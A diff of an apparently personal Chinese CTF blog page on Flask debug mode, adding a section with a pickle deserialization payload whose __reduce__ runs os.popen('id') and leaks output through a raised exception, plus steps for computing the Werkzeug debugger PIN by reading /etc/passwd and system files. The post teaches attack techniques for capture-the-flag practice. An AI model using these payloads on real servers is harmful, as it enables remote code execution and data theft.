@@ -19,17 +19,17 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得 module name 一般不变就是flask.app getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变 flask库下app.py的绝对路径。通过报错信息就会泄露该值。 mac地址的十进制数。通过文件&#x2F;sys&#x2F;cl">
+    <meta name="description" content="通过报错回显当可以命令执行，但是无回显且机器不出网时，可以通过报错回显。以一个pickle反序列化的题目为例 12345class Email():email &#x3D; &quot;admin@admin.com&quot;def __reduce__(self):    return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).pop">
 <meta property="og:type" content="article">
 <meta property="og:title" content="flask debug模式">
 <meta property="og:url" content="http://mekrina.github.io/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得 module name 一般不变就是flask.app getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变 flask库下app.py的绝对路径。通过报错信息就会泄露该值。 mac地址的十进制数。通过文件&#x2F;sys&#x2F;cl">
+<meta property="og:description" content="通过报错回显当可以命令执行，但是无回显且机器不出网时，可以通过报错回显。以一个pickle反序列化的题目为例 12345class Email():email &#x3D; &quot;admin@admin.com&quot;def __reduce__(self):    return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).pop">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://mekrina.github.io/blogs/images/flask_debug_mode1.png">
 <meta property="og:image" content="http://mekrina.github.io/blogs/images/flask_debug_mode2.png">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-08T05:55:00.441Z">
+<meta property="article:modified_time" content="2025-03-11T13:54:07.968Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://mekrina.github.io/blogs/images/flask_debug_mode1.png">
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          317 字
+          439 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          3 分钟
+          4 分钟
         
       </span>
     
@@ -278,7 +278,10 @@
             
               <div class="markdown-body">
                 
-                <ol>
+                <h2 id="通过报错回显"><a href="#通过报错回显" class="headerlink" title="通过报错回显"></a>通过报错回显</h2><p>当可以命令执行，但是无回显且机器不出网时，可以通过报错回显。以一个pickle反序列化的题目为例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span>():<br>email = <span class="hljs-string">&quot;admin@admin.com&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read())&quot;</span>,))<br></code></pre></td></tr></table></figure>
+<p>python中exec相当于php的eval，可以用于在当前进程中执行python代码。<br>这里主动抛出错误，错误内容是要获取的值，从而在报错信息中得到flag</p>
+<h2 id="计算pin码进行RCE"><a href="#计算pin码进行RCE" class="headerlink" title="计算pin码进行RCE"></a>计算pin码进行RCE</h2><ol>
 <li>服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得</li>
 <li>module name 一般不变就是flask.app</li>
 <li>getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变</li>
@@ -377,9 +380,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/XXE/XXE/" title="XXE">
+                      <a href="/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" title="SSTI模版注入">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">XXE</span>
+                        <span class="hidden-mobile">SSTI模版注入</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -387,8 +390,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/uncategorized/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="http请求走私">
-                        <span class="hidden-mobile">http请求走私</span>
+                      <a href="/blogs/XXE/XXE/" title="XXE">
+                        <span class="hidden-mobile">XXE</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
